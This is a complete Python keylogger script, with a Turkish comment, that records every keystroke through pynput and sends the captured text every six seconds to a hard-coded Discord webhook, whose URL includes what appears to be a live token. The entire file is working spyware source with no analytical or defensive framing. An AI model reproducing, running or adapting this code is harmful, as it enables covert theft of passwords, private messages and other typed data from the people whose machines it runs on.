

from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener, Key

WEBHOOK_URL = 'https://discord.com/api/webhooks/1142561716069220392/kUD1jXeYtj9GHkxkAaP27osqbEovFjDBsMJbZHav0SN155-PfWMFIZS1uClesV-g173o'
TIME_INTERVAL = 6  # Loglari gönderme araligi
ALPHABET = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        if hasattr(key, 'char') and key.char in ALPHABET:
            self.log += key.char
        elif hasattr(key, 'name') and key.name not in ALPHABET:
            self.log += f"[{key.name}]"

    def run(self):
        self._report()
        with Listener(on_press=self._on_key_press) as t:
            t.join()


if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()

